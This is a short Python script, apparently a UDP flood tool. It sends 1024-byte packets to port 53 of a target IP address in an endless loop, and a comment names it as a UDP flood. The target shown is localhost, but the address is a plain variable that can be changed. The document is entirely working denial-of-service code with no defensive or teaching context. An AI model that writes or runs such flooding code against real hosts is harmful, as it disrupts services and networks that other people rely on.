import socket
target_ip = "127.0.0.1"
target_port = 53  # DNS port (common for UDP floods)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while True:
    print("---- flooding udp -----")
    sock.sendto(b"X" * 1024, (target_ip, target_port)) 